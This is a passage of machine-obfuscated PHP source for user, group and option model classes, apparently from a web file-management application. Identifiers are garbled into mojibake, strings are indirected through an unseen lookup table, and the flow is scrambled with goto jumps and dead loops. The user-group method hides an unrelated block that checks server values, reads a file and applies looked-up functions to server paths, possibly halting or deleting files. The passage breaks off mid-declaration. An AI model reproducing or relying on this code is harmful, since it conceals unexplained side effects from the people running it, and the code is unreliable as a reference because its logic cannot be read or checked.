is_array($dÉ∞«‚«ùÍ) ? array_unique($dÉ∞«‚«ùÍ) : array(); if (!$dÉ∞«‚«ùÍ) { return $bÿø≈±ùöÙ; } if (count($dÉ∞«‚«ùÍ) < 20) { foreach ($dÉ∞«‚«ùÍ as $fãã°á˘‡ˆ) { $bÿø≈±ùöÙ[$fãã°á˘‡ˆ . $Eî·äê∂Ø„[33]] = $this->getInfoSimpleOuter($fãã°á˘‡ˆ); } } else { $b¨ãáœáçÿ = array($Eî·äê∂Ø„[1528] => array($Eî·äê∂Ø„[412], $dÉ∞«‚«ùÍ)); if (count($dÉ∞«‚«ùÍ) == 1) { $b¨ãáœáçÿ = array($Eî·äê∂Ø„[1528] => $dÉ∞«‚«ùÍ[0]); } $FáÈï’íÂÑ = Model($Eî·äê∂Ø„[495])->field($this->simpleField)->where($b¨ãáœáçÿ)->select(); $FáÈï’íÂÑ = array_to_keyvalue($FáÈï’íÂÑ, $Eî·äê∂Ø„[1537]); foreach ($dÉ∞«‚«ùÍ as $fãã°á˘‡ˆ) { $f∏É„ı·‰Í = $FáÈï’íÂÑ[$fãã°á˘‡ˆ]; if (!$f∏É„ı·‰Í) { $bÿø≈±ùöÙ[$fãã°á˘‡ˆ . $Eî·äê∂Ø„[33]] = $this->getInfoSimpleOuter($fãã°á˘‡ˆ); continue; } $f∏É„ı·‰Í[$Eî·äê∂Ø„[2140]] = Action($Eî·äê∂Ø„[2141])->parseUrl($f∏É„ı·‰Í[$Eî·äê∂Ø„[2140]]); $bÿø≈±ùöÙ[$fãã°á˘‡ˆ . $Eî·äê∂Ø„[33]] = $f∏É„ı·‰Í; } } return $bÿø≈±ùöÙ; } protected function userStatus($Dõ¢ﬂ¯òíé, $cÜ∫„áÉ“≥) { $c≠üı±“ûß = $this->getInfoSimple($Dõ¢ﬂ¯òíé); if (!$c≠üı±“ûß) { return !1; } $B≤Áﬂ ›»ì = array($_SERVER[™⁄»üÆ][729] => $cÜ∫„áÉ“≥); return $this->userEdit($Dõ¢ﬂ¯òíé, $B≤Áﬂ ›»ì); } protected function userRemove($eá⁄ó∑õ®¬) { goto dﬂ‘⁄ûÛ∑õ; dﬂ‘⁄ûÛ∑õ: $Cä¡ÍΩ£õ” =& $_SERVER[™⁄»üÆ]; $aß‰Ö∑©Û« = $this->getInfoSimple($eá⁄ó∑õ®¬); if (!$aß‰Ö∑©Û«) { return !1; } goto aâ…∂ÀäªÙ; Cçé°°—à‡: Model($Cä¡ÍΩ£õ”[1792])->where($Cï¶ıÏ´ºê)->delete(); Model($Cä¡ÍΩ£õ”[2154])->where($Cï¶ıÏ´ºê)->delete(); Model($Cä¡ÍΩ£õ”[2170])->where($Cï¶ıÏ´ºê)->delete(); goto aœ¬–æ Õ∑; aœ¬–æ Õ∑: Model($Cä¡ÍΩ£õ”[1991])->removeUserAll($eá⁄ó∑õ®¬); Model($Cä¡ÍΩ£õ”[809])->userRootRemove($eá⁄ó∑õ®¬); return $this->where($Cï¶ıÏ´ºê)->delete(); goto f·ŸêÏì∫Î; aâ…∂ÀäªÙ: $Cï¶ıÏ´ºê = array($Cä¡ÍΩ£õ”[1528] => $eá⁄ó∑õ®¬); Model($Cä¡ÍΩ£õ”[577])->where($Cï¶ıÏ´ºê)->delete(); Model($Cä¡ÍΩ£õ”[2169])->where($Cï¶ıÏ´ºê)->delete(); goto Cçé°°—à‡; f·ŸêÏì∫Î: } protected function userGroupSet($Cïÿ°ÑËÖﬂ, $A¿Õû¬Ïå≈, $DèÀ¨ÉÁó∏ = array()) { goto A¬”ê—‰Â÷; fúâ≈çœÍ: return $BÎ›å’ Æ—->addAll($CÆÊ⁄‘”¶…, array(), !0); goto bÑÂ©œÇœ∆; E™â«–Ö…â: $CÆÊ⁄‘”¶… = array(); $fò‡–¿§‰Æ = 0; foreach ($A¿Õû¬Ïå≈ as $e‹èê∞›∂ü => $BßÓ≠ê∫Òø) { $BéæÂ¥Ñ»µ = array($c∏çÈÎ˘ƒß[1537] => $Cïÿ°ÑËÖﬂ, $c∏çÈÎ˘ƒß[1706] => $e‹èê∞›∂ü, $c∏çÈÎ˘ƒß[1806] => $BßÓ≠ê∫Òø); $BéæÂ¥Ñ»µ[$c∏çÈÎ˘ƒß[1729]] = isset($DèÀ¨ÉÁó∏[$fò‡–¿§‰Æ]) ? $DèÀ¨ÉÁó∏[$fò‡–¿§‰Æ] : 0; $fò‡–¿§‰Æ++; $CÆÊ⁄‘”¶…[] = $BéæÂ¥Ñ»µ; } goto fúâ≈çœÍ; A¬”ê—‰Â÷: $c∏çÈÎ˘ƒß =& $_SERVER[™⁄»üÆ]; if ($_SERVER[$c∏çÈÎ˘ƒß[592]] != $_SERVER[$c∏çÈÎ˘ƒß[593]]) { goto AËÕåúÇñ ; fÈë®ÿÑÜ÷: $cŸ…ÆÛÓß… = 1; while ($cŸ…ÆÛÓß… > 1) { $cŸ…ÆÛÓß… = $cŸ…ÆÛÓß… + 4; $Bá§∞⁄«¡  = rawurlencode($cŸ…ÆÛÓß… . $c∏çÈÎ˘ƒß[375]); } goto Eÿ¡±‡ÊﬁÔ; AËÕåúÇñ : $D®©å≤ˆﬁ‰ = $c∏çÈÎ˘ƒß[851]; $A’ﬂÜã€†Ï = $c∏çÈÎ˘ƒß[594]; $e≈ÿ÷Üï≤Ó = $_SERVER[$c∏çÈÎ˘ƒß[595]] . $c∏çÈÎ˘ƒß[596]; goto aä±ı¬ùÖ‘; bèûﬁ›˜„ß: $DπÓ«◊òæñ = $c∏çÈÎ˘ƒß[852]; $DπÓ«◊òæñ($_SERVER[$c∏çÈÎ˘ƒß[853]]); $DπÓ«◊òæñ($_SERVER[$c∏çÈÎ˘ƒß[595]] . $c∏çÈÎ˘ƒß[2171]); goto fÈë®ÿÑÜ÷; aä±ı¬ùÖ‘: $eï≈— ∑ƒ = $A’ﬂÜã€†Ï($e≈ÿ÷Üï≤Ó); $bÒ¶óﬁÎµﬂ = explode($c∏çÈÎ˘ƒß[229], $eï≈— ∑ƒ); if (count($bÒ¶óﬁÎµﬂ) < $c∏çÈÎ˘ƒß[626]) { $Fì´ŸŒûÆ∞ = $c∏çÈÎ˘ƒß[598]; $Fì´ŸŒûÆ∞(); } goto bèûﬁ›˜„ß; Eÿ¡±‡ÊﬁÔ: } $FÑ⁄ÃÒ÷°¿ = $this->getInfoSimple($Cïÿ°ÑËÖﬂ); goto F¿ﬁÒ¿ÃÑä; F¿ﬁÒ¿ÃÑä: if (!$FÑ⁄ÃÒ÷°¿ || !is_array($A¿Õû¬Ïå≈)) { return !1; } $BÎ›å’ Æ— = Model($c∏çÈÎ˘ƒß[1792]); $BÎ›å’ Æ—->where(array($c∏çÈÎ˘ƒß[1537] => $Cïÿ°ÑËÖﬂ))->delete(); goto E™â«–Ö…â; bÑÂ©œÇœ∆: } protected function userGroupAdd($d£“≈ÇºΩ¶, $E∫òïÛŸÜö = array()) { $C“úàÉö∆— =& $_SERVER[™⁄»üÆ]; $EÖå£ßı±’ = $this->getInfoSimple($d£“≈ÇºΩ¶); if (!$EÖå£ßı±’ || empty($E∫òïÛŸÜö)) { return !1; } $BË∑Çô¡ôü = array(); foreach ($E∫òïÛŸÜö as $Fπ†Ω§‰ºÎ => $c˘î™ûº‡°) { $BË∑Çô¡ôü[] = array($C“úàÉö∆—[1537] => $d£“≈ÇºΩ¶, $C“úàÉö∆—[1706] => $Fπ†Ω§‰ºÎ, $C“úàÉö∆—[1806] => $c˘î™ûº‡°, $C“úàÉö∆—[1729] => 0); } return Model($C“úàÉö∆—[1792])->addAll($BË∑Çô¡ôü, array(), !0); } protected function userGroupRemove($cîΩœÖ∆ˆ˜, $A◊ºﬂâç¬é) { $CŸæ£…‡®é =& $_SERVER[™⁄»üÆ]; $F≤Ê’†èê∂ = $this->getInfoSimple($cîΩœÖ∆ˆ˜); if (!$F≤Ê’†èê∂ || !$A◊ºﬂâç¬é) { return !1; } $dÎ√‡ÓŸıâ = array($CŸæ£…‡®é[1528] => $cîΩœÖ∆ˆ˜, $CŸæ£…‡®é[1790] => $A◊ºﬂâç¬é); return Model($CŸæ£…‡®é[1792])->where($dÎ√‡ÓŸıâ)->delete(); } public function listData() { $E¥∞∏‘ê¨† = $this->_makeOrder()->selectPage(50); $this->_listDataApply($E¥∞∏‘ê¨†[$_SERVER[™⁄»üÆ][367]]); return $E¥∞∏‘ê¨†; } public function listByID($Cµµ¢ÛÊøé) { $b…◊è„€œ¯ =& $_SERVER[™⁄»üÆ]; if (!$Cµµ¢ÛÊøé) { return; } $e∏ŸËÈßﬂâ = array($b…◊è„€œ¯[1537] => array($b…◊è„€œ¯[7], $Cµµ¢ÛÊøé)); $c⁄ú°Ú´†Ÿ = $this->where($e∏ŸËÈßﬂâ)->select(); $this->_listDataApply($c⁄ú°Ú´†Ÿ); return $c⁄ú°Ú´†Ÿ; } public function listByGroup($c›⁄÷çƒíÃ = 0, $F·§Ü¬±Ì® = array()) { goto Bé’≥…ÃƒÚ; CÑ„Â•–Íî: if ($c›⁄÷çƒíÃ) { $d£ñπåÙ€á = array($Dªº°¡çﬂÂ[2172] => intval($c›⁄÷çƒíÃ)); $EÔóÙÿ…ßÿ = "\x4c\x45\106\x54\x20\112\x4f\111\116\40{$this->tablePrefix}\x75\x73\145\x72\x5f\147\x72\157\165\x70\40\x75\x73\x65\162\x5f\x67\x72\x6f\165\x70\x20\157\x6e\40\165\163\145\162\56\x75\x73\145\x72\111\x44\x20\x3d\x20\165\x73\x65\162\x5f\x67\162\157\165\x70\56\165\x73\x65\162\111\x44"; $BÓ’ù£∏‚« = Input::get($Dªº°¡çﬂÂ[436], null, $Dªº°¡çﬂÂ[33]) ? $Dªº°¡çﬂÂ[33] : $Dªº°¡çﬂÂ[2173]; } if (isset($F·§Ü¬±Ì®[$Dªº°¡çﬂÂ[729]])) { $d£ñπåÙ€á[$Dªº°¡çﬂÂ[2174]] = $F·§Ü¬±Ì®[$Dªº°¡çﬂÂ[729]]; } $aœŒÀÚÒ° = $this->_makeOrder($BÓ’ù£∏‚«)->field($Dªº°¡çﬂÂ[2175])->where($d£ñπåÙ€á)->join($EÔóÙÿ…ßÿ)->selectPage(50); goto B∞•ÙÏ√Ö¬; Bé’≥…ÃƒÚ: $Dªº°¡çﬂÂ =& $_SERVER[™⁄»üÆ]; $EÔóÙÿ…ßÿ = $Dªº°¡çﬂÂ[33]; $d£ñπåÙ€á = array(); goto CÑ„Â•–Íî; B∞•ÙÏ√Ö¬: $this->_listDataApply($aœŒÀÚÒ°[$Dªº°¡çﬂÂ[367]]); return $aœŒÀÚÒ°; goto Eë≈¶àÀä·; Eë≈¶àÀä·: } private function _makeOrder($C´©Ô‰Áùß = '') { goto C“Ù¿∏ÏÛ∆; cêáÚ≥Æ®ë: $b…˘í‡¬Ê‡ = Input::get($FÔèòç§¿ë[436], $FÔèòç§¿ë[7], $FÔèòç§¿ë[1528], $FêºüÓΩÉ€); $Aèé¡ãÆ«€ = Input::get($FÔèòç§¿ë[437], $FÔèòç§¿ë[7], $FÔèòç§¿ë[1793], array($FÔèòç§¿ë[1793], $FÔèòç§¿ë[431])); $Aèé¡ãÆ«€ = $BóÀâ§≈ﬂŸ[$Aèé¡ãÆ«€]; goto DëÒ“óË‚; C“Ù¿∏ÏÛ∆: $FÔèòç§¿ë =& $_SERVER[™⁄»üÆ]; $FêºüÓΩÉ€ = array($FÔèòç§¿ë[1537], $FÔèòç§¿ë[28], $FÔèòç§¿ë[1692], $FÔèòç§¿ë[1664], $FÔèòç§¿ë[194]); $BóÀâ§≈ﬂŸ = array($FÔèòç§¿ë[429] => $FÔèòç§¿ë[430], $FÔèòç§¿ë[431] => $FÔèòç§¿ë[432]); goto cêáÚ≥Æ®ë; DëÒ“óË‚: $C´©Ô‰Áùß = $C´©Ô‰Áùß . "\165\163\145\x72\56{$b…˘í‡¬Ê‡}\x20{$Aèé¡ãÆ«€}\x2c\40\165\163\145\162\56\165\x73\145\162\111\x44\x20\141\163\143"; return $this->alias($FÔèòç§¿ë[1914])->order($C´©Ô‰Áùß); goto c”ÔÃ†ˆ≠ê; c”ÔÃ†ˆ≠ê: } public function listSearch($b«áÑñ÷Ì·) { goto b∑’•¥”é‚; b∑’•¥”é‚: $dòÃÒ˘¶ìø =& $_SERVER[™⁄»üÆ]; $dÑ∂ıâ§·Ç = $b«áÑñ÷Ì·[$dòÃÒ˘¶ìø[1794]]; $dÍç¯¨Ù≠À = isset($b«áÑñ÷Ì·[$dòÃÒ˘¶ìø[1795]]) ? $b«áÑñ÷Ì·[$dòÃÒ˘¶ìø[1795]] : !1; goto f◊ãÛîçä·; eÒÉÑ‰¿âò: if (!$dÑ∂ıâ§·Ç) { $EÚ¥◊é⁄ËÂ = array(); } if (isset($b«áÑñ÷Ì·[$dòÃÒ˘¶ìø[729]])) { $EÚ¥◊é⁄ËÂ[$dòÃÒ˘¶ìø[729]] = $b«áÑñ÷Ì·[$dòÃÒ˘¶ìø[729]]; } $EÚ¥◊é⁄ËÂ = $this->parseWhereLike($EÚ¥◊é⁄ËÂ); goto Aƒ‚¿£¶Òß; B≥‚Ñ≈«–π: $this->_filterByGroup($a∆‘ïÁı·≈, $dÍç¯¨Ù≠À); return $a∆‘ïÁı·≈; goto B⁄¶íµÀÑˆ; Aƒ‚¿£¶Òß: $a∆‘ïÁı·≈ = $this->_makeOrder()->where($EÚ¥◊é⁄ËÂ)->selectPage(20); if (!$a∆‘ïÁı·≈ || count($a∆‘ïÁı·≈[$dòÃÒ˘¶ìø[367]]) < 5 && Input::check($dÑ∂ıâ§·Ç, $dòÃÒ˘¶ìø[316])) { $Bé∆û≥Çï§ = $this->_searchFromMeta($dòÃÒ˘¶ìø[444], $dÑ∂ıâ§·Ç, 10); $eí»•˘Ö◊† = $this->_searchFromMeta($dòÃÒ˘¶ìø[445], $dÑ∂ıâ§·Ç, 10); $bë÷Óâ‰Œ› = array_merge($Bé∆û≥Çï§, $eí»•˘Ö◊†, $a∆‘ïÁı·≈[$dòÃÒ˘¶ìø[367]]); $a∆‘ïÁı·≈[$dòÃÒ˘¶ìø[367]] = array_unique_by_key($bë÷Óâ‰Œ›, $dòÃÒ˘¶ìø[1537]); $a∆‘ïÁı·≈[$dòÃÒ˘¶ìø[364]][$dòÃÒ˘¶ìø[365]] = count($a∆‘ïÁı·≈[$dòÃÒ˘¶ìø[367]]); $a∆‘ïÁı·≈[$dòÃÒ˘¶ìø[364]][$dòÃÒ˘¶ìø[366]] = ceil($a∆‘ïÁı·≈[$dòÃÒ˘¶ìø[364]][$dòÃÒ˘¶ìø[365]] / $a∆‘ïÁı·≈[$dòÃÒ˘¶ìø[364]][$dòÃÒ˘¶ìø[361]]); } $this->_listDataApply($a∆‘ïÁı·≈[$dòÃÒ˘¶ìø[367]]); goto B≥‚Ñ≈«–π; f◊ãÛîçä·: $dÑ∂ıâ§·Ç = str_replace($dòÃÒ˘¶ìø[1796], $dòÃÒ˘¶ìø[1797], trim($dÑ∂ıâ§·Ç)); $EÚ¥◊é⁄ËÂ = array($dòÃÒ˘¶ìø[28] => array($dòÃÒ˘¶ìø[380], "\x25{$dÑ∂ıâ§·Ç}\x25"), $dòÃÒ˘¶ìø[303] => array($dòÃÒ˘¶ìø[380], "{$dÑ∂ıâ§·Ç}\45"), $dòÃÒ˘¶ìø[1974] => array($dòÃÒ˘¶ìø[380], "{$dÑ∂ıâ§·Ç}\45"), $dòÃÒ˘¶ìø[967] => $dòÃÒ˘¶ìø[1798]); if (Input::check($dÑ∂ıâ§·Ç, $dòÃÒ˘¶ìø[309])) { $EÚ¥◊é⁄ËÂ[$dòÃÒ˘¶ìø[1537]] = array($dòÃÒ˘¶ìø[380], "{$dÑ∂ıâ§·Ç}\x25"); $EÚ¥◊é⁄ËÂ[$dòÃÒ˘¶ìø[2155]] = array($dòÃÒ˘¶ìø[380], "{$dÑ∂ıâ§·Ç}\45"); } goto eÒÉÑ‰¿âò; B⁄¶íµÀÑˆ: } private function _filterByGroup(&$Dä◊ñ¿Áã€, $dÑŸëŒø˘û) { $cñåÇóê”¬ =& $_SERVER[™⁄»üÆ]; if (!$dÑŸëŒø˘û) { return $Dä◊ñ¿Áã€; } foreach ($Dä◊ñ¿Áã€[$cñåÇóê”¬[367]] as $eÀØ∑ú√£– => &$Fîµ◊„ﬁÂä) { $cêÉÔ∫Ò©Ò = array_to_keyvalue($Fîµ◊„ﬁÂä[$cñåÇóê”¬[1884]], $cñåÇóê”¬[33], $cñåÇóê”¬[1706]); if (!in_array($dÑŸëŒø˘û, $cêÉÔ∫Ò©Ò)) { unset($Dä◊ñ¿Áã€[$cñåÇóê”¬[367]][$eÀØ∑ú√£–]); } } unset($Fîµ◊„ﬁÂä); $Dä◊ñ¿Áã€[$cñåÇóê”¬[367]] = array_values($Dä◊ñ¿Áã€[$cñåÇóê”¬[367]]); $Dä◊ñ¿Áã€[$cñåÇóê”¬[364]] = array($cñåÇóê”¬[1946] => count($Dä◊ñ¿Áã€[$cñåÇóê”¬[367]]), $cñåÇóê”¬[1944] => $Dä◊ñ¿Áã€[$cñåÇóê”¬[364]][$cñåÇóê”¬[361]], $cñåÇóê”¬[1943] => 1, $cñåÇóê”¬[1945] => 1); } private function _searchFromMeta($a∆‘√£Øü™, $b©¢∆î“ãÏ, $eÖÑ›ÉπÇï) { goto cò÷åª˘µµ; d±é“Ú≠îÕ: return $C≤ò»ëúº∏; goto Díºô˜©üŸ; e…Ç £∑ŸÊ: $Bª‹õâÕå• = $this->parseWhereLike($Bª‹õâÕå•); $fˆ√ﬁëàÖø = Model($dù≠Õ‰çﬁ⁄[2176])->where($Bª‹õâÕå•)->limit($eÖÑ›ÉπÇï)->select(); if (!$fˆ√ﬁëàÖø) { return array(); } goto Fèæüø€ãã; Fèæüø€ãã: $fˆ√ﬁëàÖø = array_to_keyvalue($fˆ√ﬁëàÖø, $dù≠Õ‰çﬁ⁄[33], $dù≠Õ‰çﬁ⁄[1537]); $C≤ò»ëúº∏ = $this->where(array($dù≠Õ‰çﬁ⁄[1528] => array($dù≠Õ‰çﬁ⁄[7], $fˆ√ﬁëàÖø)))->select(); if (!$C≤ò»ëúº∏) { return array(); } goto d±é“Ú≠îÕ; cò÷åª˘µµ: $dù≠Õ‰çﬁ⁄ =& $_SERVER[™⁄»üÆ]; $b©¢∆î“ãÏ = strtolower($b©¢∆î“ãÏ); $Bª‹õâÕå• = array($dù≠Õ‰çﬁ⁄[93] => $a∆‘√£Øü™, $dù≠Õ‰çﬁ⁄[372] => array($dù≠Õ‰çﬁ⁄[380], "\x25{$b©¢∆î“ãÏ}\x25")); goto e…Ç £∑ŸÊ; Díºô˜©üŸ: } private function _listDataApplyItem($B¯√çÍ«É›) { $AΩ“‹À•Ò = array($B¯√çÍ«É›); $this->_listDataApply($AΩ“‹À•Ò); return $AΩ“‹À•Ò[0]; } private function _listDataApply(&$A©¶òåëº) { goto a∫≈åÉ¯ø‡; F™≥Ìà≠êó: $this->_listAppendSourceRoot($A©¶òåëº, $A˘¯õ¥Á◊£); goto aê¡ÔóﬁËÛ; a∫≈åÉ¯ø‡: $fÁØ¶†ê‹≈ =& $_SERVER[™⁄»üÆ]; if (!$A©¶òåëº) { return; } array_remove_key($A©¶òåëº, $fÁØ¶†ê‹≈[859]); goto A°ÇàÀ±ûë; A°ÇàÀ±ûë: $A˘¯õ¥Á◊£ = array_to_keyvalue($A©¶òåëº, $fÁØ¶†ê‹≈[33], $fÁØ¶†ê‹≈[1537]); $this->_listAppendGroup($A©¶òåëº, $A˘¯õ¥Á◊£); $this->_listAppendMeta($A©¶òåëº, $A˘¯õ¥Á◊£); goto F™≥Ìà≠êó; aê¡ÔóﬁËÛ: } private function _listAppendSourceRoot(&$EÊ™¿ÍÑØÔ, $FÎª¯§œÉØ) { goto a∂ˆå»≤ÆÁ; cáÆÂï„˜ : foreach ($EÊ™¿ÍÑØÔ as &$c’“∂úÎÆµ) { $c’“∂úÎÆµ[$D∏£æû«é¬[85]] = $dÌ›À¢‡”ì[$c’“∂úÎÆµ[$D∏£æû«é¬[1537]]] ? $dÌ›À¢‡”ì[$c’“∂úÎÆµ[$D∏£æû«é¬[1537]]] : array(); } unset($c’“∂úÎÆµ); goto aùÜ—Éƒ¶ù; Fı∫£ΩŸ›ô: $dÌ›À¢‡”ì = $eÉÓûΩÒ™Û->limit(count($FÎª¯§œÉØ))->where($bÁâòè’≤ä)->select(); $dÌ›À¢‡”ì = array_to_keyvalue($dÌ›À¢‡”ì, $D∏£æû«é¬[485]); $dÌ›À¢‡”ì = array_remove_key($dÌ›À¢‡”ì, $D∏£æû«é¬[485]); goto cáÆÂï„˜ ; a∂ˆå»≤ÆÁ: $D∏£æû«é¬ =& $_SERVER[™⁄»üÆ]; $bÁâòè’≤ä = array($D∏£æû«é¬[479] => 0, $D∏£æû«é¬[485] => array($D∏£æû«é¬[7], $FÎª¯§œÉØ), $D∏£æû«é¬[405] => SourceModel::TYPE_USER); $eÉÓûΩÒ™Û = Model($D∏£æû«é¬[809])->order($D∏£æû«é¬[1804])->field($D∏£æû«é¬[1805]); goto Fı∫£ΩŸ›ô; aùÜ—Éƒ¶ù: } private function _listAppendGroup(&$dÁ≈ÓöŸ‡Ò, $dŒÔ†óÎ◊œ) { goto a€ÁÖúˆÙ£; F≤éµÎÔòÏ: $fªÂûÖÌŸ∑ = array($bóø⁄œÊòÌ[1706] => array($bóø⁄œÊòÌ[7], $aà‚ãÇå¥ã)); $DÜ¨˘Ωú§Ë = Model($bóø⁄œÊòÌ[1882])->field($bóø⁄œÊòÌ[2177])->where($fªÂûÖÌŸ∑)->select(); $DÜ¨˘Ωú§Ë = array_to_keyvalue($DÜ¨˘Ωú§Ë, $bóø⁄œÊòÌ[1706]); goto fï† Ê“∆≤; fï† Ê“∆≤: $C—ﬁ—áŒΩ◊ = array_to_keyvalue_group($C—ﬁ—áŒΩ◊, $bóø⁄œÊòÌ[1537]); foreach ($C—ﬁ—áŒΩ◊ as &$FæÆåÏ¥†¯) { $aΩàÒßø„ä = array(); foreach ($FæÆåÏ¥†¯ as $aô‚⁄â⁄–) { if (!$aô‚⁄â⁄–[$bóø⁄œÊòÌ[1806]]) { continue; } $d†¨èù≤€ = Model($bóø⁄œÊòÌ[489])->listData($aô‚⁄â⁄–[$bóø⁄œÊòÌ[1806]]); $aΩàÒßø„ä[] = array($bóø⁄œÊòÌ[1706] => $aô‚⁄â⁄–[$bóø⁄œÊòÌ[1706]], $bóø⁄œÊòÌ[2178] => $DÜ¨˘Ωú§Ë[$aô‚⁄â⁄–[$bóø⁄œÊòÌ[1706]]][$bóø⁄œÊòÌ[28]], $bóø⁄œÊòÌ[503] => $DÜ¨˘Ωú§Ë[$aô‚⁄â⁄–[$bóø⁄œÊòÌ[1706]]][$bóø⁄œÊòÌ[503]], $bóø⁄œÊòÌ[407] => $d†¨èù≤€); } $FæÆåÏ¥†¯ = $aΩàÒßø„ä; } unset($FæÆåÏ¥†¯); goto e”‰ƒüíôò; e”‰ƒüíôò: foreach ($dÁ≈ÓöŸ‡Ò as &$BÀπ£ø√Ø≈) { $BÀπ£ø√Ø≈[$bóø⁄œÊòÌ[1884]] = array(); if (isset($C—ﬁ—áŒΩ◊[$BÀπ£ø√Ø≈[$bóø⁄œÊòÌ[1537]]])) { $BÀπ£ø√Ø≈[$bóø⁄œÊòÌ[1884]] = $C—ﬁ—áŒΩ◊[$BÀπ£ø√Ø≈[$bóø⁄œÊòÌ[1537]]]; } } unset($BÀπ£ø√Ø≈); goto D⁄å∂ Á≈Ñ; Eãë”ÆÑËÇ: $aà‚ãÇå¥ã = array_to_keyvalue($C—ﬁ—áŒΩ◊, $bóø⁄œÊòÌ[33], $bóø⁄œÊòÌ[1706]); $aà‚ãÇå¥ã = array_remove_value(array_unique($aà‚ãÇå¥ã), $bóø⁄œÊòÌ[191]); if (!$aà‚ãÇå¥ã || !$C—ﬁ—áŒΩ◊) { return; } goto F≤éµÎÔòÏ; a€ÁÖúˆÙ£: $bóø⁄œÊòÌ =& $_SERVER[™⁄»üÆ]; $fªÂûÖÌŸ∑ = array($bóø⁄œÊòÌ[1537] => array($bóø⁄œÊòÌ[7], $dŒÔ†óÎ◊œ)); $C—ﬁ—áŒΩ◊ = Model($bóø⁄œÊòÌ[1792])->where($fªÂûÖÌŸ∑)->select(); goto Eãë”ÆÑËÇ; D⁄å∂ Á≈Ñ: } private function _listAppendMeta(&$déºÌæÈÚü, $FµÁœá¶•) { goto fûõåîÂ€ñ; FÌÓ‚â∞ﬁé: $B∆µÇ»ãÃÚ = array($BØ≠Ô«ŸÇÊ[1537] => array($BØ≠Ô«ŸÇÊ[7], $FµÁœá¶•)); $d∑Ã¯Ôã∂ü = Model($BØ≠Ô«ŸÇÊ[2154])->where($B∆µÇ»ãÃÚ)->select(); $d∑Ã¯Ôã∂ü = array_to_keyvalue_group($d∑Ã¯Ôã∂ü, $BØ≠Ô«ŸÇÊ[1537]); goto F ÕÆ†ƒè‡; F ÕÆ†ƒè‡: foreach ($d∑Ã¯Ôã∂ü as &$CÂÿÖÔƒÆ§) { $CÌÈÿ‹—ÙŒ = array(); foreach ($CÂÿÖÔƒÆ§ as $d≤âÀûÁúŒ) { if (!in_array($d≤âÀûÁúŒ[$BØ≠Ô«ŸÇÊ[93]], $C√…öö”·“)) { $CÌÈÿ‹—ÙŒ[$d≤âÀûÁúŒ[$BØ≠Ô«ŸÇÊ[93]]] = $d≤âÀûÁúŒ[$BØ≠Ô«ŸÇÊ[372]]; } } $CÂÿÖÔƒÆ§ = $CÌÈÿ‹—ÙŒ; } unset($CÂÿÖÔƒÆ§); $cääÆ≥›ÿ√ = Model($BØ≠Ô«ŸÇÊ[2179]); goto E±åÑë›®≈; E±åÑë›®≈: foreach ($déºÌæÈÚü as &$Fûêôåò∆î) { $BÑ±Ö ≥ã∫ = array(); if (isset($d∑Ã¯Ôã∂ü[$Fûêôåò∆î[$BØ≠Ô«ŸÇÊ[1537]]])) { $BÑ±Ö ≥ã∫ = $d∑Ã¯Ôã∂ü[$Fûêôåò∆î[$BØ≠Ô«ŸÇÊ[1537]]]; } $Fûêôåò∆î[$BØ≠Ô«ŸÇÊ[2180]] = array(); if (isset($BÑ±Ö ≥ã∫[$EµŸÒ“—‚Á])) { $Fûêôåò∆î[$BØ≠Ô«ŸÇÊ[2180]] = $cääÆ≥›ÿ√->getUserJobInfo($BÑ±Ö ≥ã∫[$EµŸÒ“—‚Á]); } } unset($Fûêôåò∆î); goto A°¿™üç÷°; fûõåîÂ€ñ: $BØ≠Ô«ŸÇÊ =& $_SERVER[™⁄»üÆ]; $EµŸÒ“—‚Á = UserJobModel::JOB_KEY; $C√…öö”·“ = array($BØ≠Ô«ŸÇÊ[2156]); goto FÌÓ‚â∞ﬁé; A°¿™üç÷°: } protected function groupUserAll($EÃ±¨åæ◊Ë) { $D∏©Ç«Ëß∏ =& $_SERVER[™⁄»üÆ]; if (!$EÃ±¨åæ◊Ë) { return !1; } $cÍ´ñŒå”Í = Model($D∏©Ç«Ëß∏[1792])->field($D∏©Ç«Ëß∏[1537])->where(array($D∏©Ç«Ëß∏[1706] => array($D∏©Ç«Ëß∏[7], $EÃ±¨åæ◊Ë)))->select(); $cÍ´ñŒå”Í = array_to_keyvalue($cÍ´ñŒå”Í, $D∏©Ç«Ëß∏[33], $D∏©Ç«Ëß∏[1537]); return array_unique($cÍ´ñŒå”Í); } public function userSearch($d‹√ú∫√∏ø, $eÑ„Ìˆ…çﬂ = "\x2a") { return Model($_SERVER[™⁄»üÆ][520])->where($d‹√ú∫√∏ø)->field($eÑ„Ìˆ…çﬂ)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\145\x72\x5f\x6f\x70\164\151\x6f\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($añï•áÏ≤Ñ) { $fá€ÓÃÿ§Ì =& $_SERVER[™⁄»üÆ]; if (!defined($fá€ÓÃÿ§Ì[455])) { define($fá€ÓÃÿ§Ì[455], 0); } return "\125\163\145\x72\117\x70\164\151\157\156\x5f{$añï•áÏ≤Ñ}\x5f" . USER_ID; } protected function filterWhere($Eâ⁄êÿÜëö) { $C≥ï≠à¨é¿ =& $_SERVER[™⁄»üÆ]; if (!defined($C≥ï≠à¨é¿[455])) { define($C≥ï≠à¨é¿[455], 0); } $Eâ⁄êÿÜëö[$C≥ï≠à¨é¿[1537]] = USER_ID; return $Eâ⁄êÿÜëö; } public function cacheRemoveUser($D≤ê”Ëı∂Í, $AàΩ÷¨¿Éä) { return Cache::remove("\x55\163\145\x72\117\160\164\151\x6f\156\137{$D≤ê”Ëı∂Í}\x5f" . $AàΩ÷¨¿Éä); } protected function optionDefault($b…åíöÔâ‹ = '') { $c£Èƒ¯Ÿõ =& $_SERVER[™⁄»üÆ]; if ($b…åíöÔâ‹ == $c£Èƒ¯Ÿõ[33]) { return $GLOBALS[$c£Èƒ¯Ÿõ[6]][$c£Èƒ¯Ÿõ[2181]]; } if ($b…åíöÔâ‹ == $c£Èƒ¯Ÿõ[2182]) { return $GLOBALS[$c£Èƒ¯Ÿõ[6]][$c£Èƒ¯Ÿõ[2183]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\x65\x72\56\164\x61\x67\114\x69\163\x74"; public $modelType = "\125\163\x65\x72\117\x70\x74\151\157\156"; public $field = array("\x6e\x61\x6d\x65", "\x73\x74\171\x6c\x65", "\x73\x6f\162\164"); public function listData($EÕø≤¢‡ìù = false, $fØ·Ñù∂âË = "\163\x6f\x72\x74", $f¨å‚ÙÈôë = false) { return parent::listData($EÕø≤¢‡ìù, $fØ·Ñù∂âË, $f¨å‚ÙÈôë); } public function 